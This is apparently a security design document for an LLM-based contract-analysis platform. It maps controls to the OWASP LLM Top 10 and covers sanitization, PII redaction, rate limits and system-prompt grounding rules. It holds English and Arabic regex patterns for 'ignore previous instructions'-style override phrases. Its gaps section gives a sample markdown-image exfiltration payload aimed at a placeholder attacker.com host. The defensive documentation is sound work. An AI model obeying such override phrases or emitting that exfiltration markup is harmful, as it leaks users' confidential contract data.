# Aqdy Platform Security & Guardrails

This document outlines the security architecture, input validation, and guardrails implemented across the Aqdy contract analysis platform, mapped against the **OWASP Top 10 for Large Language Model (LLM) Applications** (2023 version).

---

## 🛡️ OWASP LLM Top 10 Security Control Mapping

The table below maps each OWASP LLM risk to its implementation status, repository-relative code location, and corresponding security controls.

| OWASP Risk ID | Risk Name | Status | Code Reference | Control Mechanism |
| :--- | :--- | :--- | :--- | :--- |
| **LLM01** | Prompt Injection | **Partial** | `backend/src/services/sanitization.service.ts`<br>`backend/src/routes/upload.route.ts` | **Ingestion**: Strict bilingual injection pattern regex checks (English & Arabic) and template injection markers removal before sending contract clauses to LLM context.<br>**Chat**: *Not Implemented* (only basic Zod structure check is performed on chat inputs). |
| **LLM02** | Insecure Output Handling | **Implemented** | `backend/src/agents/extractor.agent.ts`<br>`backend/src/agents/riskClassifier.agent.ts`<br>`backend/src/agents/redline.agent.ts` | Output schema enforcement using Zod validation; automated JSON repairing; strict data-only rendering in frontend. |
| **LLM03** | Training Data Poisoning | **Accepted Risk** | *External API dependency* | Aqdy uses vetted commercial APIs (Google Gemini) rather than fine-tuning or training base models locally. |
| **LLM04** | Model Denial of Service | **Implemented** | `backend/src/middlewares/rateLimit.ts`<br>`backend/src/controllers/clauseChat.controller.ts`<br>`backend/src/middlewares/upload.middleware.ts` | Rate limiters for IP/Users; maximum clause length truncation (5,000 chars); file upload constraints (10MB); credit verification before processing. |
| **LLM05** | Supply Chain Vulnerabilities | **Implemented** | `package.json`<br>`.github/workflows/ci-cd.yml` | Automated dependency auditing (`npm audit --audit-level=high`) and static secret scanning (`trufflehog`) integrated in the GitHub Actions CI pipeline. |
| **LLM06** | Sensitive Information Disclosure | **Partial** | `backend/src/services/piiFiltering.ts`<br>`backend/src/routes/upload.route.ts` | **Ingestion**: Automated regex-based redact and filter layer replacing sensitive data (National IDs, Credit Cards, Phones, Emails) with `[REDACTED]` prior to DB storage or LLM execution.<br>**Chat**: *Not Implemented* (no PII scrubbing is applied to chat message inputs or LLM streams). |
| **LLM07** | Insecure Plugin Design | **Not Applicable** | *No plugin integrations* | Aqdy agents operate in read-only isolation without write access to databases, plugins, or remote system commands. |
| **LLM08** | Excessive Agency | **Implemented** | `backend/src/agents/extractor.agent.ts`<br>`backend/src/agents/riskClassifier.agent.ts` | LLM response validation restricts actions; models receive minimal read-only state scope and have no terminal/system execution capabilities. |
| **LLM09** | Overreliance | **Implemented** | `backend/src/agents/riskClassifier.agent.ts`<br>`backend/src/controllers/clauseChat.controller.ts` | RAG vector matching against legal knowledge base; LLM confidence score blended with vector similarity score; disclaimers in user interfaces. |
| **LLM10** | Model Theft | **Accepted Risk** | *External API dependency* | Aqdy interfaces with external APIs; proprietary prompts are shielded in the backend environment. Rate limits restrict bulk prompt harvesting. |

---

## 🛠️ Detailed Documentation of Controls

### 1. Input Sanitization & Validation

Aqdy implements distinct multi-layer input controls for contract uploads and clause chats.

#### A. Contract Uploads (`POST /api/upload`)
- **File Restrictions**: The platform strictly restricts uploads to valid `.pdf` and `.docx` MIME types, enforcing a hard **10MB** upload limit via `backend/src/middlewares/upload.middleware.ts` to prevent server memory saturation.
- **Null Byte and Script Stripping**: The raw parsed text extracted from documents is passed through the `sanitizeText` utility in `backend/src/middlewares/security.middleware.ts` to strip malicious JavaScript, HTML script tags, XSS payloads, and null bytes (`\0`) before persistence or analysis triggering.

```typescript
export function sanitizeText(text: string): string {
  if (!text) return "";
  return text
    .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, "") // Strip HTML script tags
    .replace(/<[^>]*>/g, "")                                           // Strip other HTML tags
    .replace(/\0/g, "")                                                // Remove null bytes
    .trim();
}
```

#### B. Chat Inputs (`POST /api/contracts/:contractId/clauses/:clauseIndex/chat`)
- **Payload Schema Validation**: Chat messages are parsed and validated using Zod schemas (`ClauseChatBodySchema` in `backend/src/controllers/clauseChat.controller.ts`), ensuring values are trimmed, present, and formatted as expected.
- **Index Constraints**: Parameters are validated to ensure requested index targets exist within bounds of the previously generated contract analysis, preventing out-of-bounds queries.
- **Limitation**: Active text sanitization, prompt injection checks, and PII filtering are **not** applied to clause chat inputs (they are sent as raw human message strings).

---

### 2. System Prompt Protection Measures

To defend against jailbreaks and prompt override attempts (such as DAN, opposite mode, and role override tricks), Aqdy applies system prompt boundaries.

#### A. Instruction Grounding
All system prompts define strict instructions restricting LLM generation to the context provided. The LLM is commanded to reject external instructions and refuse speculation.

```text
// Example System Instructions from backend/src/controllers/clauseChat.controller.ts
INSTRUCTIONS:
1. ONLY answer questions about this specific clause based on the text, risk level, explanation, and KB sources provided.
2. Do NOT speculate beyond the provided context.
3. Do NOT answer questions that are outside the provided clause context or completely unrelated to this clause. If the question cannot be answered using the provided context, state clearly: "I do not have enough information to answer this based on the provided clause context."
4. Respond in the same language as the user's message.
```

#### B. Active Input Interception (Ingestion Pipeline Only)
Before contract text is processed by agents, the `SanitizationService` runs a regex scanner matching specific adversarial instructions in both English and Arabic. When a match occurs, the dangerous payload is replaced with standard neutral labels (e.g., `[INSTRUCTION_OVERRIDE_REMOVED]`), rendering the attack harmless.

```typescript
// From backend/src/services/sanitization.service.ts
export const INJECTION_PATTERNS = [
  {
    name: "ignore_previous",
    category: "Instruction Override",
    regex: /\b(ignore\s+(all\s+)?(previous|prior|above|earlier|your|the\s+previous|initial)\s+(instructions?|prompts?|rules?|guidelines?|directions?|commands?|context|constraints?))/gi,
    replacement: "[INSTRUCTION_OVERRIDE_REMOVED]",
    description: "Classic ignore previous instructions injection"
  },
  {
    name: "arabic_ignore_instructions",
    category: "Arabic Injection",
    regex: /(تجاهل|انسَ|انس|تخطَّ|تخط|ألغِ|الغ)\s+(جميع\s+)?(التعليمات|الأوامر|الإرشادات|الارشادات|البرمجة|القيود)/g,
    replacement: "[ARABIC_INJECTION_REMOVED]",
    description: "Arabic: ignore instructions injection"
  }
];
```

*Note: While `strictSecurityMiddleware` is defined in `backend/src/middlewares/security.middleware.ts`, it is currently not integrated into routes. The application relies on direct invokes of sanitization and prompt injection checks in controllers and orchestrators.*

---

### 3. Output Guardrails & PII Filtering

Aqdy enforces post-generation output guardrails and strict pre-storage PII scrubbing.

#### A. Pre-Storage PII Filtering (Ingestion Pipeline Only)
Before any contract text is written to the database or exposed to the LLM backend pipelines, it is scrubbed of Personally Identifiable Information (PII) using regex-based redaction patterns covering emails, credit cards, Egyptian National IDs, US SSNs, and phone numbers.

```typescript
// From backend/src/services/piiFiltering.ts
export function redactPII(text: string): string {
  if (!text) return text;
  let redacted = text;
  redacted = redacted.replace(EMAIL_REGEX, "[REDACTED]");
  redacted = redacted.replace(CC_REGEX, "[REDACTED]");
  redacted = redacted.replace(EGY_NID_REGEX, "[REDACTED]");
  redacted = redacted.replace(SSN_REGEX, "[REDACTED]");
  redacted = redacted.replace(EGY_PHONE_REGEX, "[REDACTED]");
  return redacted;
}
```

#### B. Output Guardrails & Schema Validation
All LLM output is structured and validated against strict schemas before being returned. If the LLM generates bad output formatting, a repair protocol sanitizes the output.

```typescript
// From backend/src/agents/extractor.agent.ts
export const ExtractedClauseSchema = z.object({
  clauseNumber: z.number().int().positive(),
  clauseText: z.string().min(1),
  clauseType: z.string().min(1),
  confidence: z.number().min(0).max(1).default(1.0),
});
```

---

### 4. Rate Limiting & Abuse Prevention

To prevent DoS, spamming of expensive LLM endpoints, and model billing exhaustion, Aqdy implements rate limits across multiple tiers.

- **Anonymous IP Rate Limit**: Applies to public endpoints (like upload). Limits unauthenticated users to a maximum of **20 requests per 15-minute window** based on IP (`backend/src/middlewares/rateLimit.ts`).
- **User Daily Limit (Free Tier)**: Limits authenticated free-tier users to **10 contract analyses per 24 hours** (`backend/src/middlewares/rateLimit.ts`).
- **Clause Chat Limit**: Chat requests to a specific clause are tracked per-user in an in-memory map, capping interactions at **20 messages per clause per 24 hours** (`backend/src/controllers/clauseChat.controller.ts`).
- **Credit Enforcement**: Each chat query deducts credits (`env.CHAT_CREDIT_COST`) via the ledger service, making automated scripting economically unfeasible.

---

## ⚠️ Identified Security Gaps & Remediation Plan

We have analyzed potential gaps and planned corresponding remediations to further harden the platform:

### 1. Missing Sanitization & PII Checks on Chat Input
- **Risk**: Chat message inputs bypass active text sanitization, prompt injection screening, and PII redactors. An attacker can attempt direct system prompt overrides via the chat interface or leak PII into logs and external APIs.
- **Remediation**: Update `backend/src/controllers/clauseChat.controller.ts` to pipe the user's message parameter through `sanitizeText`, `detectPromptInjection`, and `redactPII` before forming LangChain payloads.

### 2. In-Memory Rate Limiting Volatility
- **Risk**: The current IP rate-limiting, daily analysis counters, and chat limit maps are stored in-memory (`Map` structures). If the Express server restarts or auto-scales, these limits reset, allowing attackers to bypass boundaries.
- **Remediation**: Migrate the rate-limiting tracking store to an external Redis or Memcached cache database. This ensures persistent, atomic counter updates across container restarts and multi-instance deployments.

### 3. Lack of Outgoing Web-Content / Data Exfiltration Scanning
- **Risk**: While raw text is neutered of embedded URL signatures to prevent direct data exfiltration (exfiltrating contract clauses to external attacker URLs), a sophisticated indirect injection could theoretically trick the LLM into generating markdown images (`![exfil](https://attacker.com/log?data=...)`) which the user's browser might render.
- **Remediation**: Implement an HTML and markdown content security policy (CSP) on the frontend that denies rendering remote assets, and apply an output checker in the backend to reject responses containing unsolicited markdown URL templates or external hyperlinks.

### 4. Unused `strictSecurityMiddleware`
- **Risk**: The middleware `strictSecurityMiddleware` is defined but completely unused in routing files. While functions are directly invoked in `upload.route.ts` and `orchestrator.service.ts`, the presence of dead/unused middleware can cause confusion during audits.
- **Remediation**: Either integrate `strictSecurityMiddleware` systematically across relevant route handlers (like chat routes) or deprecate/remove the unused export to keep the security boundary explicit and clean.
